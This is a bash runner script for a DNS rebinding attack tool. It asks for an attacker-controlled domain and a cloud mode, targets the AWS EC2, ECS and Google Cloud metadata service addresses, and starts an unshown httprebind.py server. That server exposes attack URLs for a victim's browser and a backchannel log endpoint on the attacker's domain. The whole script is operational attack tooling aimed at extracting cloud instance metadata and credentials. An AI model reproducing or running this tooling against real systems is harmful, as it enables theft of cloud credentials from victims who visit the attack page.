#!/bin/bash
# DNS Rebinding Tool Runner Script

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}  DNS Rebinding Attack Tool${NC}"
    echo -e "${BLUE}================================${NC}"
}

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   print_error "This script must be run as root (use sudo)"
   exit 1
fi

print_header

# Get server IP
IP=$(curl -s ifconfig.me)
if [ -z "$IP" ]; then
    print_error "Could not detect server IP"
    exit 1
fi

print_status "Server IP detected: $IP"

# Get domain from user if not provided
if [ -z "$1" ]; then
    echo -e "${YELLOW}Enter your domain name (e.g., myrebinding.com):${NC} "
    read -r DOMAIN
else
    DOMAIN=$1
fi

if [ -z "$DOMAIN" ]; then
    print_error "Domain name is required"
    exit 1
fi

# Get mode from user if not provided
if [ -z "$2" ]; then
    echo
    echo -e "${YELLOW}Select target mode:${NC}"
    echo "1) ec2    - AWS EC2 instances"
    echo "2) ecs    - AWS ECS containers"
    echo "3) gcloud - Google Cloud Platform"
    echo -e "${YELLOW}Enter choice (1-3):${NC} "
    read -r CHOICE

    case $CHOICE in
        1) MODE="ec2" ;;
        2) MODE="ecs" ;;
        3) MODE="gcloud" ;;
        *) print_error "Invalid choice"; exit 1 ;;
    esac
else
    MODE=$2
fi

# Validate mode
if [[ "$MODE" != "ec2" && "$MODE" != "ecs" && "$MODE" != "gcloud" ]]; then
    print_error "Invalid mode. Must be: ec2, ecs, or gcloud"
    exit 1
fi

print_status "Domain: $DOMAIN"
print_status "Mode: $MODE"
print_status "Target metadata service: $([ "$MODE" == "ecs" ] && echo "169.254.170.2" || echo "169.254.169.254")"

# Pre-flight checks
print_status "Running pre-flight checks..."

# Check if httprebind.py exists
if [ ! -f "httprebind.py" ]; then
    print_error "httprebind.py not found in current directory"
    exit 1
fi

# Check Python dependencies
print_status "Checking Python dependencies..."
python3 -c "import dnslib, flask, flask_cors" 2>/dev/null || {
    print_error "Missing Python dependencies. Run: pip3 install -r requirements.txt"
    exit 1
}

# Check if ports are available
print_status "Checking port availability..."
if netstat -tuln | grep -q ":53 "; then
    print_warning "Port 53 is already in use. DNS server may conflict."
fi

if netstat -tuln | grep -q ":80 "; then
    print_warning "Port 80 is already in use. Using port 8080 for HTTP server."
    HTTP_PORT=8080
else
    HTTP_PORT=80
fi

# Test DNS resolution
print_status "Testing DNS resolution..."
DIG_RESULT=$(dig +short $DOMAIN @8.8.8.8 2>/dev/null)
if [ -z "$DIG_RESULT" ]; then
    print_warning "DNS resolution failed for $DOMAIN"
    print_warning "Make sure your domain's nameservers point to this server ($IP)"
else
    print_status "DNS resolution OK: $DOMAIN -> $DIG_RESULT"
fi

# Show attack URLs
echo
print_status "Attack will be available at:"
echo "  HTTP:  http://$DOMAIN"
echo "  HTTPS: https://$DOMAIN (if SSL is configured)"
echo
print_status "Backchannel logging at:"
echo "  http://bc.$DOMAIN/log"

# Ask for confirmation
echo
echo -e "${YELLOW}Ready to start DNS rebinding attack. Continue? (y/N):${NC} "
read -r CONFIRM
if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
    print_status "Aborted by user"
    exit 0
fi

# Create log directory
mkdir -p logs
LOG_FILE="logs/rebinding-$(date +%Y%m%d-%H%M%S).log"

# Start the attack
print_status "Starting DNS rebinding attack..."
print_status "Logs will be saved to: $LOG_FILE"
print_status "Press Ctrl+C to stop"

echo
echo -e "${BLUE}=================== ATTACK STARTED ===================${NC}"
echo "Visit http://$DOMAIN in a target browser to begin the attack"
echo -e "${BLUE}=======================================================${NC}"

# Modify httprebind.py to use different port if needed
if [ "$HTTP_PORT" == "8080" ]; then
    # Create temporary modified version
    sed 's/port=80/port=8080/g' httprebind.py > httprebind_temp.py
    python3 httprebind_temp.py "$DOMAIN" "$IP" "$MODE" 2>&1 | tee "$LOG_FILE"
    rm -f httprebind_temp.py
else
    python3 httprebind.py "$DOMAIN" "$IP" "$MODE" 2>&1 | tee "$LOG_FILE"
fi
